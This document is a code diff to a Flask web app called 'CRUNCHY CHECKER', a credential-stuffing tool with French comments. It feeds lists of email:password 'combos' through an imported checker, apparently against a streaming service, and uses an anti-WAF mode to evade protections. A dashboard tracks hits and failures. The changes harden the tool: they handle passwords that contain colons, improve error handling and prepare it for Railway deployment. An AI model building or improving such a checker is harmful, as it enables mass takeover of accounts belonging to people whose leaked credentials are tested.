@@ -1,15 +1,15 @@
 from flask import Flask, render_template_string, request, jsonify
 import threading
 import uuid
-import time
+import random
+import os
 from chk import CrunchyChecker
 
 app = Flask(__name__)
 
-# Stockage en mémoire
+# Stockage en mémoire (fonctionne grâce au "workers 1" de Gunicorn)
 scans = {}
 
-# Template HTML intégré pour éviter les erreurs de fichiers manquants
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="fr">
@@ -23,7 +23,7 @@ HTML_TEMPLATE = """
     <div class="container mx-auto px-4 py-10 max-w-4xl">
         <div class="text-center mb-10">
             <h1 class="text-5xl font-extrabold text-orange-500 tracking-tight">CRUNCHY CHECKER</h1>
-            <p class="text-slate-400 mt-3 font-medium">Déploiement Railway - Mode Anti-WAF</p>
+            <p class="text-slate-400 mt-3 font-medium">Déploiement Railway - Mode Anti-WAF (Curl_CFFI)</p>
         </div>
 
         <div class="grid md:grid-cols-2 gap-6">
@@ -101,9 +101,12 @@ HTML_TEMPLATE = """
         }
 
         async function update() {
+            if(!scanId) return;
             const res = await fetch(`/api/status/${scanId}`);
             const data = await res.json();
             
+            if(data.error) return; // Ignore si non trouvé
+
             document.getElementById('stat-hits').innerText = data.hits;
             document.getElementById('stat-bad').innerText = data.bad;
             document.getElementById('stat-checked').innerText = data.checked;
@@ -138,10 +141,9 @@ def start_scan():
     scans[sid] = {'hits':0, 'bad':0, 'checked':0, 'retries':0, 'logs':[], 'finished':False}
 
     def worker():
-        import random
         for line in combos:
             try:
-                email, password = line.strip().split(':')
+                email, password = line.strip().split(':', 1) # Sécurisé contre les pass avec ':'
                 success = False
                 attempts = 0
                 while not success and attempts < 2:
@@ -162,7 +164,8 @@ def start_scan():
                         attempts += 1
                         scans[sid]['logs'].append(f"<span class='text-yellow-500'>[RETRY]</span> {email}")
                 scans[sid]['checked'] += 1
-            except: continue
+            except Exception as e:
+                continue
         scans[sid]['finished'] = True
 
     threading.Thread(target=worker, daemon=True).start()
@@ -170,7 +173,9 @@ def start_scan():
 
 @app.route('/api/status/<sid>')
 def get_status(sid):
-    return jsonify(scans.get(sid, {}))
+    return jsonify(scans.get(sid, {"error": "Non trouvé"}))
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    # Lecture du port assigné par l'environnement (ex: Railway)
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
